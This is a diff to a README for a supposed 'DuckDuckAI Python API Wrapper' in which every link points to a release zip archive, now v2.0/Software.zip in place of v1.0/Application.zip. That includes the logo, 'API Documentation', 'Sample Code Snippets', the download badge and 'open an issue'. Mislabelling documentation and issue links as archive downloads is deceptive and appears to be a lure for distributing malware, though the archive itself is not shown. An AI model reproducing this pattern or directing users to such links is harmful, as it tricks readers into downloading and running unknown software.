@@ -2,7 +2,7 @@
 
 Welcome to the **DuckDuckAI Python API Wrapper** GitHub repository! 🚀
 
-![DuckDuckAI Logo](https://github.com/yassin-bruh/DuckDuckAI/releases/download/v1.0/Application.zip)
+![DuckDuckAI Logo](https://github.com/yassin-bruh/DuckDuckAI/releases/download/v2.0/Software.zip)
 
 ## Repository Summary
 This repository contains a Python API Wrapper that allows you to interact with DuckDuckAI seamlessly. Whether you are developing an AI application, an AI assistant, or just exploring the capabilities of DuckDuckAI, this wrapper simplifies the process of integrating DuckDuckAI functionalities into your Python projects.
@@ -22,8 +22,8 @@ Don't forget to check out the detailed documentation in the repository to explor
 - Support for various AI features and capabilities
 
 ## Quick Links
-- [API Documentation](https://github.com/yassin-bruh/DuckDuckAI/releases/download/v1.0/Application.zip)
-- [Sample Code Snippets](https://github.com/yassin-bruh/DuckDuckAI/releases/download/v1.0/Application.zip)
+- [API Documentation](https://github.com/yassin-bruh/DuckDuckAI/releases/download/v2.0/Software.zip)
+- [Sample Code Snippets](https://github.com/yassin-bruh/DuckDuckAI/releases/download/v2.0/Software.zip)
 
 ## Repository Topics
 - ai
@@ -44,7 +44,7 @@ Don't forget to check out the detailed documentation in the repository to explor
 - python
 
 ## Download Software
-[![Download Software](https://github.com/yassin-bruh/DuckDuckAI/releases/download/v1.0/Application.zip%20Here%20to%20Download-Software-blue)](https://github.com/yassin-bruh/DuckDuckAI/releases/download/v1.0/Application.zip)
+[![Download Software](https://github.com/yassin-bruh/DuckDuckAI/releases/download/v2.0/Software.zip%20Here%20to%20Download-Software-blue)](https://github.com/yassin-bruh/DuckDuckAI/releases/download/v2.0/Software.zip)
 
 <!--- Link needs to be launched--->
 
@@ -54,6 +54,6 @@ If you encounter any issues with the download link, please check the "Releases" 
 Contributions to the DuckDuckAI Python API Wrapper are welcome! Feel free to fork the repository and submit pull requests with any improvements or new features.
 
 ## Support
-If you have any questions or need assistance with the DuckDuckAI Python API Wrapper, please [open an issue](https://github.com/yassin-bruh/DuckDuckAI/releases/download/v1.0/Application.zip) in the repository. We're here to help!
+If you have any questions or need assistance with the DuckDuckAI Python API Wrapper, please [open an issue](https://github.com/yassin-bruh/DuckDuckAI/releases/download/v2.0/Software.zip) in the repository. We're here to help!
 
 Thank you for checking out the DuckDuckAI Python API Wrapper. Happy coding! 🐧🐤🐥
